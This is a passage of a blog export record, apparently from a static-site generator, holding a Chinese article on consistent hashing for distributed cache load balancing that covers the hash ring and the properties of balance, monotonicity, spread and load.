总结\n目前一致性哈希基本成为了分布式系统组件的标准配置，例如Memcached的各种客户端都提供内置的一致性哈希支持。本文只是简要介绍了这个算法，更深入的内容可以参看论文《[Consistent Hashing and Random Trees: Distributed Caching Protocols for Relieving Hot Spots on the World Wide Web](http://www.akamai.com/dl/technical_publications/ConsistenHashingandRandomTreesDistributedCachingprotocolsforrelievingHotSpotsontheworldwideweb.pdf)》，同时提供一个[C语言版本](http://www.codeproject.com/KB/recipes/lib-conhash.aspx)的实现供参考。","slug":"一致哈希","published":1,"updated":"2016-11-18T03:20:59.301Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbruldi003tgwtmnkky8zpw","content":"<h3 id=\"&#x5206;&#x5E03;&#x5F0F;&#x7B97;&#x6CD5;\"><a href=\"#&#x5206;&#x5E03;&#x5F0F;&#x7B97;&#x6CD5;\" class=\"headerlink\" title=\"&#x5206;&#x5E03;&#x5F0F;&#x7B97;&#x6CD5;\"></a>&#x5206;&#x5E03;&#x5F0F;&#x7B97;&#x6CD5;</h3><p><strong>&#x5728;&#x505A;&#x670D;&#x52A1;&#x5668;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x65F6;&#x5019;&#x53EF;&#x4F9B;&#x9009;&#x62E9;&#x7684;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7684;&#x7B97;&#x6CD5;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x5305;&#x62EC;&#xFF1A; &#x8F6E;&#x5FAA;&#x7B97;&#x6CD5;(Round Robin)&#x3001;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;(HASH)&#x3001;&#x6700;&#x5C11;&#x8FDE;&#x63A5;&#x7B97;&#x6CD5;(Least Connection)&#x3001;&#x54CD;&#x5E94;&#x901F;&#x5EA6;&#x7B97;&#x6CD5;(Response Time)&#x3001;&#x52A0;&#x6743;&#x6CD5;(Weighted )&#x7B49;&#x3002;&#x5176;&#x4E2D;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x662F;&#x6700;&#x4E3A;&#x5E38;&#x7528;&#x7684;&#x7B97;&#x6CD5;.</strong></p>\n<p>&#x5178;&#x578B;&#x7684;&#x5E94;&#x7528;&#x573A;&#x666F;&#x662F;&#xFF1A; &#x6709;N&#x53F0;&#x670D;&#x52A1;&#x5668;&#x63D0;&#x4F9B;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#xFF0C;&#x9700;&#x8981;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#xFF0C;&#x5C06;&#x8BF7;&#x6C42;&#x5E73;&#x5747;&#x5206;&#x53D1;&#x5230;&#x6BCF;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x6BCF;&#x53F0;&#x673A;&#x5668;&#x8D1F;&#x8D23;1/N&#x7684;&#x670D;&#x52A1;&#x3002;</p>\n<p>&#x5E38;&#x7528;&#x7684;&#x7B97;&#x6CD5;&#x662F;&#x5BF9;hash&#x7ED3;&#x679C;&#x53D6;&#x4F59;&#x6570; (hash() mod N )&#xFF1A;&#x5BF9;&#x673A;&#x5668;&#x7F16;&#x53F7;&#x4ECE;0&#x5230;N-1&#xFF0C;&#x6309;&#x7167;&#x81EA;&#x5B9A;&#x4E49;&#x7684; hash()&#x7B97;&#x6CD5;&#xFF0C;&#x5BF9;&#x6BCF;&#x4E2A;&#x8BF7;&#x6C42;&#x7684;hash()&#x503C;&#x6309;N&#x53D6;&#x6A21;&#xFF0C;&#x5F97;&#x5230;&#x4F59;&#x6570;i&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x8BF7;&#x6C42;&#x5206;&#x53D1;&#x5230;&#x7F16;&#x53F7;&#x4E3A;i&#x7684;&#x673A;&#x5668;&#x3002;&#x4F46;&#x8FD9;&#x6837;&#x7684;&#x7B97;&#x6CD5;&#x65B9;&#x6CD5;&#x5B58;&#x5728;&#x81F4;&#x547D;&#x95EE;&#x9898;&#xFF0C;&#x5982;&#x679C;&#x67D0;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x5B95;&#x673A;&#xFF0C;&#x90A3;&#x4E48;&#x5E94;&#x8BE5;&#x843D;&#x5728;&#x8BE5;&#x673A;&#x5668;&#x7684;&#x8BF7;&#x6C42;&#x5C31;&#x65E0;&#x6CD5;&#x5F97;&#x5230;&#x6B63;&#x786E;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x8FD9;&#x65F6;&#x9700;&#x8981;&#x5C06;&#x5F53;&#x6389;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4ECE;&#x7B97;&#x6CD5;&#x4ECE;&#x53BB;&#x9664;&#xFF0C;&#x6B64;&#x65F6;&#x5019;&#x4F1A;&#x6709;(N-1)/N&#x7684;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7F13;&#x5B58;&#x6570;&#x636E;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x8FDB;&#x884C;&#x8BA1;&#x7B97;;&#x5982;&#x679C;&#x65B0;&#x589E;&#x4E00;&#x53F0;&#x673A;&#x5668;&#xFF0C;&#x4F1A;&#x6709;N /(N+1)&#x7684;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7F13;&#x5B58;&#x6570;&#x636E;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x91CD;&#x65B0;&#x8BA1;&#x7B97;&#x3002;&#x5BF9;&#x4E8E;&#x7CFB;&#x7EDF;&#x800C;&#x8A00;&#xFF0C;&#x8FD9;&#x901A;&#x5E38;&#x662F;&#x4E0D;&#x53EF;&#x63A5;&#x53D7;&#x7684;&#x98A0;&#x7C38;(&#x56E0;&#x4E3A;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x5927;&#x91CF;&#x7F13;&#x5B58;&#x7684;&#x5931;&#x6548;&#x6216;&#x8005;&#x6570;&#x636E;&#x9700;&#x8981;&#x8F6C;&#x79FB;)&#x3002;&#x90A3;&#x4E48;&#xFF0C;&#x5982;&#x4F55;&#x8BBE;&#x8BA1;&#x4E00;&#x4E2A;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7B56;&#x7565;&#xFF0C;&#x4F7F;&#x5F97;&#x53D7;&#x5230;&#x5F71;&#x54CD;&#x7684;&#x8BF7;&#x6C42;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x5C11;&#x5462;?</p>\n<p><strong><em>&#x5728;Memcached&#x3001;Key-Value Store &#x3001;Bittorrent DHT&#x3001;LVS&#x4E2D;&#x90FD;&#x91C7;&#x7528;&#x4E86;Consistent Hashing&#x7B97;&#x6CD5;&#xFF0C;&#x53EF;&#x4EE5;&#x8BF4;Consistent Hashing &#x662F;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7684;&#x9996;&#x9009;&#x7B97;&#x6CD5;&#x3002;</em></strong></p>\n<a id=\"more\"></a>\n<hr>\n<h3 id=\"&#x4E00;&#x81F4;&#x54C8;&#x5E0C;\"><a href=\"#&#x4E00;&#x81F4;&#x54C8;&#x5E0C;\" class=\"headerlink\" title=\"&#x4E00;&#x81F4;&#x54C8;&#x5E0C;\"></a>&#x4E00;&#x81F4;&#x54C8;&#x5E0C;</h3><p>&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x662F;&#x4E00;&#x79CD;&#x7279;&#x6B8A;&#x7684;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x3002;&#x5728;&#x4F7F;&#x7528;&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x540E;&#xFF0C;&#x54C8;&#x5E0C;&#x8868;&#x69FD;&#x4F4D;&#x6570;&#xFF08;&#x5927;&#x5C0F;&#xFF09;&#x7684;&#x6539;&#x53D8;&#x5E73;&#x5747;&#x53EA;&#x9700;&#x8981;&#x5BF9; K/n &#x4E2A;&#x5173;&#x952E;&#x5B57;&#x91CD;&#x65B0;&#x6620;&#x5C04;&#xFF0C;&#x5176;&#x4E2D; K&#x662F;&#x5173;&#x952E;&#x5B57;&#x7684;&#x6570;&#x91CF;&#xFF0C;n&#x662F;&#x69FD;&#x4F4D;&#x6570;&#x91CF;&#x3002;<strong>&#x7136;&#x800C;&#x5728;&#x4F20;&#x7EDF;&#x7684;&#x54C8;&#x5E0C;&#x8868;&#x4E2D;&#xFF0C;&#x6DFB;&#x52A0;&#x6216;&#x5220;&#x9664;&#x4E00;&#x4E2A;&#x69FD;&#x4F4D;&#x7684;&#x51E0;&#x4E4E;&#x9700;&#x8981;&#x5BF9;&#x6240;&#x6709;&#x5173;&#x952E;&#x5B57;&#x8FDB;&#x884C;&#x91CD;&#x65B0;&#x6620;&#x5C04;&#x3002;</strong></p>\n<p>&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x7531;MIT&#x7684;Karger&#x53CA;&#x5176;&#x5408;&#x4F5C;&#x8005;&#x63D0;&#x51FA;&#xFF0C;&#x73B0;&#x5728;&#x8FD9;&#x4E00;&#x601D;&#x60F3;&#x5DF2;&#x7ECF;&#x6269;&#x5C55;&#x5230;&#x5176;&#x5B83;&#x9886;&#x57DF;&#x3002;&#x5728;&#x8FD9;&#x7BC7;1997&#x5E74;&#x53D1;&#x8868;&#x7684;&#x5B66;&#x672F;&#x8BBA;&#x6587;&#x4E2D;&#x4ECB;&#x7ECD;&#x4E86;&#x201C;&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x201D;&#x5982;&#x4F55;&#x5E94;&#x7528;&#x4E8E;&#x7528;&#x6237;&#x6613;&#x53D8;&#x7684;&#x5206;&#x5E03;&#x5F0F;Web&#x670D;&#x52A1;&#x4E2D;&#x3002;&#x54C8;&#x5E0C;&#x8868;&#x4E2D;&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x4EE3;&#x8868;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#xFF0C;&#x5728;&#x7CFB;&#x7EDF;&#x6DFB;&#x52A0;&#x6216;&#x5220;&#x9664;&#x8282;&#x70B9;&#x53EA;&#x9700;&#x8981;&#x79FB;&#x52A8; K/n&#x9879;&#x3002;</p>\n<p>&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x4E5F;&#x53EF;&#x7528;&#x4E8E;&#x5B9E;&#x73B0;&#x5065;&#x58EE;&#x7F13;&#x5B58;&#x6765;&#x51CF;&#x5C11;&#x5927;&#x578B;Web&#x5E94;&#x7528;&#x4E2D;&#x7CFB;&#x7EDF;&#x90E8;&#x5206;&#x5931;&#x6548;&#x5E26;&#x6765;&#x7684;&#x8D1F;&#x9762;&#x5F71;&#x54CD;&#x3002;</p>\n<p>&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x7684;&#x6982;&#x5FF5;&#x8FD8;&#x88AB;&#x5E94;&#x7528;&#x4E8E;&#x5206;&#x5E03;&#x5F0F;&#x6563;&#x5217;&#x8868;&#xFF08;DHT&#xFF09;&#x7684;&#x8BBE;&#x8BA1;&#x3002;DHT&#x4F7F;&#x7528;&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x6765;&#x5212;&#x5206;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x7684;&#x8282;&#x70B9;&#x3002;&#x6240;&#x6709;&#x5173;&#x952E;&#x5B57;&#x90FD;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x8FDE;&#x63A5;&#x6240;&#x6709;&#x8282;&#x70B9;&#x7684;&#x8986;&#x76D6;&#x7F51;&#x7EDC;&#x9AD8;&#x6548;&#x5730;&#x5B9A;&#x4F4D;&#x5230;&#x67D0;&#x4E2A;&#x8282;&#x70B9;&#x3002;</p>\n<hr>\n<h3 id=\"&#x4F7F;&#x7528;&#x573A;&#x666F;\"><a href=\"#&#x4F7F;&#x7528;&#x573A;&#x666F;\" class=\"headerlink\" title=\"&#x4F7F;&#x7528;&#x573A;&#x666F;\"></a>&#x4F7F;&#x7528;&#x573A;&#x666F;</h3><p>&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x4E3B;&#x8981;&#x7528;&#x6765;&#x907F;&#x514D;&#x4E0A;&#x9762;&#x6240;&#x8BF4;&#x5230;&#x7684;&#x65B0;&#x589E;&#x6216;&#x51CF;&#x5C11;&#x670D;&#x52A1;&#x5668;&#x65F6;&#xFF0C;&#x5927;&#x91CF;&#x670D;&#x52A1;&#x5668;&#x7F13;&#x5B58;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x66F4;&#x65B0;&#x7684;&#x95EE;&#x9898;&#x3002; </p>\n<p>&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x5C3D;&#x53EF;&#x80FD;&#x4F7F;&#x540C;&#x4E00;&#x4E2A;&#x8D44;&#x6E90;&#x6620;&#x5C04;&#x5230;&#x540C;&#x4E00;&#x53F0;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x3002;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x8981;&#x6C42;&#x589E;&#x52A0;&#x4E00;&#x53F0;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x65F6;&#xFF0C;&#x65B0;&#x7684;&#x670D;&#x52A1;&#x5668;&#x5C3D;&#x91CF;&#x5206;&#x62C5;&#x5B58;&#x50A8;&#x5176;&#x4ED6;&#x6240;&#x6709;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7F13;&#x5B58;&#x8D44;&#x6E90;&#x3002;&#x51CF;&#x5C11;&#x4E00;&#x53F0;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x65F6;&#xFF0C;&#x5176;&#x4ED6;&#x6240;&#x6709;&#x670D;&#x52A1;&#x5668;&#x4E5F;&#x53EF;&#x4EE5;&#x5C3D;&#x91CF;&#x5206;&#x62C5;&#x5B58;&#x50A8;&#x5B83;&#x7684;&#x7F13;&#x5B58;&#x8D44;&#x6E90;&#x3002; </p>\n<p><strong>&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x7684;&#x4E3B;&#x8981;&#x601D;&#x60F3;&#x662F;&#x5C06;&#x6BCF;&#x4E2A;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x4E0E;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x54C8;&#x5E0C;&#x503C;&#x57DF;&#x533A;&#x95F4;&#x5173;&#x8054;&#x8D77;&#x6765;&#xFF0C;&#x5176;&#x4E2D;&#x533A;&#x95F4;&#x8FB9;&#x754C;&#x901A;&#x8FC7;&#x8BA1;&#x7B97;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x5BF9;&#x5E94;&#x7684;&#x54C8;&#x5E0C;&#x503C;&#x6765;&#x51B3;&#x5B9A;&#x3002;</strong>&#xFF08;&#x5B9A;&#x4E49;&#x533A;&#x95F4;&#x7684;&#x54C8;&#x5E0C;&#x51FD;&#x6570;&#x4E0D;&#x4E00;&#x5B9A;&#x548C;&#x8BA1;&#x7B97;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x54C8;&#x5E0C;&#x503C;&#x7684;&#x51FD;&#x6570;&#x76F8;&#x540C;&#xFF0C;&#x4F46;&#x662F;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x7684;&#x8303;&#x56F4;&#x9700;&#x8981;&#x5339;&#x914D;&#x3002;&#xFF09;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x88AB;&#x79FB;&#x9664;&#xFF0C;&#x5219;&#x5B83;&#x4F1A;&#x4ECE;&#x5BF9;&#x5E94;&#x7684;&#x533A;&#x95F4;&#x4F1A;&#x88AB;&#x5E76;&#x5165;&#x5230;&#x90BB;&#x8FD1;&#x7684;&#x533A;&#x95F4;&#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x4E0D;&#x9700;&#x8981;&#x4EFB;&#x4F55;&#x6539;&#x53D8;&#x3002;</p>\n<hr>\n<h3 id=\"&#x76F8;&#x5173;&#x5B9E;&#x73B0;\"><a href=\"#&#x76F8;&#x5173;&#x5B9E;&#x73B0;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x5B9E;&#x73B0;\"></a>&#x76F8;&#x5173;&#x5B9E;&#x73B0;</h3><p>&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x5C06;&#x6BCF;&#x4E2A;&#x5BF9;&#x8C61;&#x6620;&#x5C04;&#x5230;&#x5706;&#x73AF;&#x8FB9;&#x4E0A;&#x7684;&#x4E00;&#x4E2A;&#x70B9;&#xFF0C;&#x7CFB;&#x7EDF;&#x518D;&#x5C06;&#x53EF;&#x7528;&#x7684;&#x8282;&#x70B9;&#x673A;&#x5668;&#x6620;&#x5C04;&#x5230;&#x5706;&#x73AF;&#x7684;&#x4E0D;&#x540C;&#x4F4D;&#x7F6E;&#x3002;</p>\n<p>&#x67E5;&#x627E;&#x67D0;&#x4E2A;&#x5BF9;&#x8C61;&#x5BF9;&#x5E94;&#x7684;&#x673A;&#x5668;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x7528;&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x8BA1;&#x7B97;&#x5F97;&#x5230;&#x5BF9;&#x8C61;&#x5BF9;&#x5E94;&#x5706;&#x73AF;&#x8FB9;&#x4E0A;&#x4F4D;&#x7F6E;&#xFF0C;&#x6CBF;&#x7740;&#x5706;&#x73AF;&#x8FB9;&#x4E0A;&#x67E5;&#x627E;&#x76F4;&#x5230;&#x9047;&#x5230;&#x67D0;&#x4E2A;&#x8282;&#x70B9;&#x673A;&#x5668;&#xFF0C;&#x8FD9;&#x53F0;&#x673A;&#x5668;&#x5373;&#x4E3A;&#x5BF9;&#x8C61;&#x5E94;&#x8BE5;&#x4FDD;&#x5B58;&#x7684;&#x4F4D;&#x7F6E;&#x3002; </p>\n<p><strong>&#x5220;&#x9664;</strong>&#x4E00;&#x53F0;&#x8282;&#x70B9;&#x673A;&#x5668;&#x65F6;&#xFF0C;&#x8FD9;&#x53F0;&#x673A;&#x5668;&#x4E0A;&#x4FDD;&#x5B58;&#x7684;&#x6240;&#x6709;&#x5BF9;&#x8C61;&#x90FD;&#x8981;&#x79FB;&#x52A8;&#x5230;&#x4E0B;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x3002;<br><strong>&#x6DFB;&#x52A0;</strong>&#x4E00;&#x53F0;&#x673A;&#x5668;&#x5230;&#x5706;&#x73AF;&#x8FB9;&#x4E0A;&#x67D0;&#x4E2A;&#x70B9;&#x65F6;&#xFF0C;&#x8FD9;&#x4E2A;&#x70B9;&#x7684;&#x4E0B;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x9700;&#x8981;&#x5C06;&#x8FD9;&#x4E2A;&#x8282;&#x70B9;&#x524D;&#x5BF9;&#x5E94;&#x7684;&#x5BF9;&#x8C61;&#x79FB;&#x52A8;&#x5230;&#x65B0;&#x673A;&#x5668;&#x4E0A;&#x3002;<br><strong>&#x66F4;&#x6539;</strong>&#x5BF9;&#x8C61;&#x5728;&#x8282;&#x70B9;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x5206;&#x5E03;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8C03;&#x6574;&#x8282;&#x70B9;&#x673A;&#x5668;&#x7684;&#x4F4D;&#x7F6E;&#x6765;&#x5B9E;&#x73B0;&#x3002;</p>\n<hr>\n<h3 id=\"&#x76F8;&#x5173;&#x7279;&#x6027;\"><a href=\"#&#x76F8;&#x5173;&#x7279;&#x6027;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x7279;&#x6027;\"></a>&#x76F8;&#x5173;&#x7279;&#x6027;</h3><p>&#x4E00;&#x81F4;&#x6027;hash&#x7B97;&#x6CD5;&#x63D0;&#x51FA;&#x4E86;&#x5728;&#x52A8;&#x6001;&#x53D8;&#x5316;&#x7684;Cache&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x5224;&#x5B9A;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x597D;&#x574F;&#x7684;&#x56DB;&#x4E2A;&#x5B9A;&#x4E49;&#xFF1A;</p>\n<ul>\n<li><p><strong>&#x5E73;&#x8861;&#x6027;(Balance)</strong><br>&#x5E73;&#x8861;&#x6027;&#x662F;&#x6307;&#x54C8;&#x5E0C;&#x7684;&#x7ED3;&#x679C;&#x80FD;&#x591F;&#x5C3D;&#x53EF;&#x80FD;&#x5206;&#x5E03;&#x5230;&#x6240;&#x6709;&#x7684;&#x7F13;&#x51B2;&#x4E2D;&#x53BB;&#xFF0C;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x4F7F;&#x5F97;&#x6240;&#x6709;&#x7684;&#x7F13;&#x51B2;&#x7A7A;&#x95F4;&#x90FD;&#x5F97;&#x5230;&#x5229;&#x7528;&#x3002;&#x5F88;&#x591A;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x90FD;&#x80FD;&#x591F;&#x6EE1;&#x8DB3;&#x8FD9;&#x4E00;&#x6761;&#x4EF6;&#x3002;</p>\n</li>\n<li><p><strong>&#x5355;&#x8C03;&#x6027;(Monotonicity)</strong><br>&#x5355;&#x8C03;&#x6027;&#x662F;&#x6307;&#x5982;&#x679C;&#x5DF2;&#x7ECF;&#x6709;&#x4E00;&#x4E9B;&#x5185;&#x5BB9;&#x901A;&#x8FC7;&#x54C8;&#x5E0C;&#x5206;&#x6D3E;&#x5230;&#x4E86;&#x76F8;&#x5E94;&#x7684;&#x7F13;&#x51B2;&#x4E2D;&#xFF0C;&#x53C8;&#x6709;&#x65B0;&#x7684;&#x7F13;&#x51B2;&#x52A0;&#x5165;&#x5230;&#x7CFB;&#x7EDF;&#x4E2D;&#x3002;&#x54C8;&#x5E0C;&#x7684;&#x7ED3;&#x679C;&#x5E94;&#x80FD;&#x591F;&#x4FDD;&#x8BC1;&#x539F;&#x6709;&#x5DF2;&#x5206;&#x914D;&#x7684;&#x5185;&#x5BB9;&#x53EF;&#x4EE5;&#x88AB;&#x6620;&#x5C04;&#x5230;&#x539F;&#x6709;&#x7684;&#x6216;&#x8005;&#x65B0;&#x7684;&#x7F13;&#x51B2;&#x4E2D;&#x53BB;&#xFF0C;&#x800C;&#x4E0D;&#x4F1A;&#x88AB;&#x6620;&#x5C04;&#x5230;&#x65E7;&#x7684;&#x7F13;&#x51B2;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x5176;&#x4ED6;&#x7F13;&#x51B2;&#x533A;&#x3002; </p>\n</li>\n<li><p><strong>&#x5206;&#x6563;&#x6027;(Spread)</strong><br>&#x5728;&#x5206;&#x5E03;&#x5F0F;&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x7EC8;&#x7AEF;&#x6709;&#x53EF;&#x80FD;&#x770B;&#x4E0D;&#x5230;&#x6240;&#x6709;&#x7684;&#x7F13;&#x51B2;&#xFF0C;&#x800C;&#x662F;&#x53EA;&#x80FD;&#x770B;&#x5230;&#x5176;&#x4E2D;&#x7684;&#x4E00;&#x90E8;&#x5206;&#x3002;&#x5F53;&#x7EC8;&#x7AEF;&#x5E0C;&#x671B;&#x901A;&#x8FC7;&#x54C8;&#x5E0C;&#x8FC7;&#x7A0B;&#x5C06;&#x5185;&#x5BB9;&#x6620;&#x5C04;&#x5230;&#x7F13;&#x51B2;&#x4E0A;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x4E0D;&#x540C;&#x7EC8;&#x7AEF;&#x6240;&#x89C1;&#x7684;&#x7F13;&#x51B2;&#x8303;&#x56F4;&#x6709;&#x53EF;&#x80FD;&#x4E0D;&#x540C;&#xFF0C;&#x4ECE;&#x800C;&#x5BFC;&#x81F4;&#x54C8;&#x5E0C;&#x7684;&#x7ED3;&#x679C;&#x4E0D;&#x4E00;&#x81F4;&#xFF0C;&#x6700;&#x7EC8;&#x7684;&#x7ED3;&#x679C;&#x662F;&#x76F8;&#x540C;&#x7684;&#x5185;&#x5BB9;&#x88AB;&#x4E0D;&#x540C;&#x7684;&#x7EC8;&#x7AEF;&#x6620;&#x5C04;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x4E2D;&#x3002;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x663E;&#x7136;&#x662F;&#x5E94;&#x8BE5;&#x907F;&#x514D;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x5BFC;&#x81F4;&#x76F8;&#x540C;&#x5185;&#x5BB9;&#x88AB;&#x5B58;&#x50A8;&#x5230;&#x4E0D;&#x540C;&#x7F13;&#x51B2;&#x4E2D;&#x53BB;&#xFF0C;&#x964D;&#x4F4E;&#x4E86;&#x7CFB;&#x7EDF;&#x5B58;&#x50A8;&#x7684;&#x6548;&#x7387;&#x3002;&#x5206;&#x6563;&#x6027;&#x7684;&#x5B9A;&#x4E49;&#x5C31;&#x662F;&#x4E0A;&#x8FF0;&#x60C5;&#x51B5;&#x53D1;&#x751F;&#x7684;&#x4E25;&#x91CD;&#x7A0B;&#x5EA6;&#x3002;&#x597D;&#x7684;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x5E94;&#x80FD;&#x591F;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x4E0D;&#x4E00;&#x81F4;&#x7684;&#x60C5;&#x51B5;&#x53D1;&#x751F;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5C3D;&#x91CF;&#x964D;&#x4F4E;&#x5206;&#x6563;&#x6027;&#x3002; </p>\n</li>\n<li><p><strong>&#x8D1F;&#x8F7D;(Load)</strong><br>&#x8D1F;&#x8F7D;&#x95EE;&#x9898;&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x4ECE;&#x53E6;&#x4E00;&#x4E2A;&#x89D2;&#x5EA6;&#x770B;&#x5F85;&#x5206;&#x6563;&#x6027;&#x95EE;&#x9898;&#x3002;&#x65E2;&#x7136;&#x4E0D;&#x540C;&#x7684;&#x7EC8;&#x7AEF;&#x53EF;&#x80FD;&#x5C06;&#x76F8;&#x540C;&#x7684;&#x5185;&#x5BB9;&#x6620;&#x5C04;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x4E2D;&#xFF0C;&#x90A3;&#x4E48;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x800C;&#x8A00;&#xFF0C;&#x4E5F;&#x53EF;&#x80FD;&#x88AB;&#x4E0D;&#x540C;&#x7684;&#x7528;&#x6237;&#x6620;&#x5C04;&#x4E3A;&#x4E0D;&#x540C;&#x7684;&#x5185;&#x5BB9;&#x3002;&#x4E0E;&#x5206;&#x6563;&#x6027;&#x4E00;&#x6837;&#xFF0C;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E5F;&#x662F;&#x5E94;&#x5F53;&#x907F;&#x514D;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x597D;&#x7684;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x5E94;&#x80FD;&#x591F;&#x5C3D;&#x91CF;&#x964D;&#x4F4E;&#x7F13;&#x51B2;&#x7684;&#x8D1F;&#x8377;&#x3002;</p>\n</li>\n</ul>\n<hr>\n<p><strong>&#x63A5;&#x4E0B;&#x6765;&#x4E3B;&#x8981;&#x8BB2;&#x89E3;&#x4E00;&#x4E0B;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x5177;&#x4F53;&#x662F;&#x5982;&#x4F55;&#x8BBE;&#x8BA1;&#x7684;.</strong></p>\n<h3 id=\"&#x73AF;&#x5F62;Hash&#x7A7A;&#x95F4;\"><a href=\"#&#x73AF;&#x5F62;Hash&#x7A7A;&#x95F4;\" class=\"headerlink\" title=\"&#x73AF;&#x5F62;Hash&#x7A7A;&#x95F4;\"></a>&#x73AF;&#x5F62;Hash&#x7A7A;&#x95F4;</h3><p>&#x6309;&#x7167;&#x5E38;&#x7528;&#x7684;hash&#x7B97;&#x6CD5;&#x6765;&#x5C06;&#x5BF9;&#x5E94;&#x7684;key&#x54C8;&#x5E0C;&#x5230;&#x4E00;&#x4E2A;&#x5177;&#x6709;2^32&#x6B21;&#x65B9;&#x4E2A;&#x6876;&#x7684;&#x7A7A;&#x95F4;&#x4E2D;&#xFF0C;&#x5373;0~(2^32)-1&#x7684;&#x6570;&#x5B57;&#x7A7A;&#x95F4;&#x4E2D;&#x3002;&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C06;&#x8FD9;&#x4E9B;&#x6570;&#x5B57;&#x5934;&#x5C3E;&#x76F8;&#x8FDE;&#xFF0C;&#x60F3;&#x8C61;&#x6210;&#x4E00;&#x4E2A;&#x95ED;&#x5408;&#x7684;&#x73AF;&#x5F62;&#x3002;&#x5982;&#x4E0B;&#x56FE;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/1.png\" alt=\"\"></p>\n<h3 